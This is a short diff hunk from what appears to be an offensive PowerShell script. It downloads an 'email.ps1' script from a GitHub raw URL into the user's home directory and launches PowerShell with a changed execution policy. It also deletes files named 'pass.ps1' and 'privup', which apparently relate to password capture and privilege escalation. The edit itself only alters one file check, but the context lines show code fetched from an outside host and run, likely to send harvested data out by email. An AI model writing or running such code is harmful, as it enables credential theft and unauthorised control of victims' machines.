@@ -8,7 +8,7 @@ $email = 'start-process PowerShell.exe -ArgumentList "Set-ExecutionPolicy -Execu
 
 if( -not (Test-Path -Path $homedir\email.ps1 -PathType Leaf)){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $homedir\email.ps1}
 if(Test-Path -Path $homedir\pass.ps1 -PathType Leaf){ Remove-Item -Path $home\pass.ps1 -Force }
-if(Test-Path -Path $homedir\privup.bat -PathType Leaf){ Remove-Item -Path $home\privup.bat -Force }
+if(Test-Path -Path $homedir\privup.ps1 -PathType Leaf){ Remove-Item -Path $home\privup.bat -Force }
 if (Test-Path -Path $homedir\$file -PathType Leaf) {
 powershell -command $email
 exit
